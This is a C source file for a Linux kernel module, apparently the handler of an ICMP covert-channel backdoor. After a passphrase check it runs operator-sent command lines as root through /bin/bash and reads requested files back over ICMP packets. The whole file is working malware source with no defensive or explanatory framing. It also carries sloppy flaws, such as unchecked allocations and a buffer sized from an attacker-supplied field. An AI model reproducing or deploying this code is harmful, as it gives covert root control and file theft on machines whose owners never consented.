#include <linux/module.h>           // Core header for loading LKMs into the kernel
#include <linux/kernel.h> 
#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/kmod.h>

#include "context.h"
#include "config.h"
#include "response.h"
#include "protocol.h"
#include "file.h"
#include "handler.h"

int answer_generic(struct Context *c, int len){
    char *recv_pp;
    printk(KERN_INFO "[HANDLER] Started Handling invalid packet");
    recv_pp = kmalloc(len, GFP_KERNEL);
    
    memcpy(recv_pp, c->recv_data, len);
    
    send_icmp((void *)recv_pp, len, c);

    kfree(recv_pp);
    return 0;
}

int handle_hello(struct Context *c) {
    struct ProtocolHello *recv_pp;
    struct ProtocolHello *resp_pp;
    int pphello_len = sizeof(struct ProtocolHello);

    printk(KERN_INFO "[HANDLER] Started Handling Hello packet");
    recv_pp = kmalloc(pphello_len, GFP_KERNEL);
    resp_pp = kmalloc(pphello_len, GFP_KERNEL);
    
    memcpy(recv_pp, c->recv_data, pphello_len);
    if (strcmp(recv_pp->passphrase, c->config.password) == 0) {
        printk(KERN_INFO "[HELLO] CORRECT PASSPHRASE");
        memcpy(resp_pp, recv_pp, pphello_len);
        resp_pp->is_response = 0xff;
        
        send_icmp((void *)resp_pp, pphello_len, c);

        c->in_session = 1;
        c->session_saddr = c->saddr;
    } else {
        printk(KERN_INFO "[HELLO] INCORRECT PASSPHRASE %s", recv_pp->passphrase);
    };

    kfree(recv_pp);
    kfree(resp_pp);
    return 0;
};

int handle_gdbye(struct Context *c) {
    struct ProtocolGoodbye *recv_pp;
    struct ProtocolGoodbye *resp_pp;
    int pphello_len = sizeof(struct ProtocolGoodbye);
    printk(KERN_INFO "[HANDLER] Started Handling goodbye packet");
    recv_pp = kmalloc(pphello_len, GFP_KERNEL);
    resp_pp = kmalloc(pphello_len, GFP_KERNEL);
    
    memcpy(recv_pp, c->recv_data, pphello_len);
    memcpy(resp_pp, recv_pp, pphello_len);
    
    resp_pp->is_response = 0xff;

    send_icmp((void *)resp_pp, pphello_len, c);

    c->in_session = 0;
    c->session_saddr = (__be32) NULL;
    if (c->download_active){
        close_file_download(c);
    }
    kfree(recv_pp);
    kfree(resp_pp);
    return 0;

}

int handle_exec(struct Context *c) {
    struct ProtocolExec *recv_pp;
    struct ProtocolExec *resp_pp;
    int ppexec_len = sizeof(struct ProtocolExec);

    printk(KERN_INFO "[HANDLER] Started Handling execute packet");

    recv_pp = kmalloc(ppexec_len, GFP_KERNEL);
    resp_pp = kmalloc(ppexec_len, GFP_KERNEL);

    memcpy(recv_pp, c->recv_data, ppexec_len);
    memcpy(resp_pp, recv_pp, ppexec_len);

    char *argv[] = { "/bin/bash", "-c", recv_pp->cmdline, NULL };
    static char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/bin",
        "TERM=linux", 
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    
    printk(KERN_INFO "[HANDLER] Cmdline: %s", recv_pp->cmdline);
    resp_pp->is_response = 0xff;
        
    send_icmp((void *)resp_pp, ppexec_len, c);

    kfree(recv_pp);
    kfree(resp_pp);
    return 0;
}

int handle_download(struct Context *c) {
    struct ProtocolDownload *recv_pp;
    struct ProtocolHeader *resp_pp;
    char *data;
    int file_res;
    int ppdown_len = sizeof(struct ProtocolDownload);
    int pphdr_len = sizeof(struct ProtocolHeader);

    

    printk(KERN_INFO "[HANDLER] Started Handling execute packet");

    recv_pp = kmalloc(ppdown_len, GFP_KERNEL);
    memcpy(recv_pp, c->recv_data, ppdown_len);

    resp_pp = kmalloc(ppdown_len + recv_pp->mps, GFP_KERNEL);
    data = (char *) resp_pp + pphdr_len;
    memset(data, 0, recv_pp->mps);
    memcpy(resp_pp, recv_pp, sizeof(struct ProtocolHeader));

    
    if(c->download_active == 0) {
        init_file_download(c, recv_pp->path, recv_pp->mps);
    }
    file_res = retreive_bytes(c, data);
    printk(KERN_INFO "[HANDLER] File Download: %s, MPS: %d", recv_pp->path, recv_pp->mps);
    printk(KERN_INFO "[HANDLER] File contents: %s", data);

    if (file_res) {
        printk(KERN_INFO "[HANDLER] Setting flag end stream");
        resp_pp->flags |= FLAG_END_STREAM;
    }
    send_icmp((void *)resp_pp, ppdown_len + recv_pp->mps, c);

    kfree(recv_pp);
    kfree(resp_pp);
    return 0;

}


int handle_packet(void *data){
    struct Context* c =  (struct Context*)data;
    struct ProtocolHeader *pphdr;
    c->handler_handling = 1;
    
    printk(KERN_INFO "Started handling packet"); 

    pphdr = kmalloc(sizeof(struct ProtocolHeader), GFP_KERNEL);
    memcpy(pphdr, c->recv_data, sizeof(struct ProtocolHeader));
    __u16 flags = pphdr->flags; 
    
    printk(KERN_INFO "Flags: %d", flags);
    
    if ((flags & FLAG_HELLO) == FLAG_HELLO) {
        handle_hello(c);
    };
    
    if (c->session_saddr == NULL) {
        answer_generic(c, pphdr->payload_len);
         kfree(pphdr);
        c->handler_handling = 0;
        return 1;
    }

    if ((flags & FLAG_EXECUTE_COMMAND) == FLAG_EXECUTE_COMMAND) {
        handle_exec(c);
    };
    
    if ((flags & FLAG_FILE_DOWNLOAD) == FLAG_FILE_DOWNLOAD) {
        handle_download(c);
    };

    if ((flags & FLAG_GDBYE) == FLAG_GDBYE) {
        handle_gdbye(c);
    }

    kfree(pphdr);
    c->handler_handling = 0;
    return 0;
};

EXPORT_SYMBOL(handle_packet);
EXPORT_SYMBOL(handle_hello);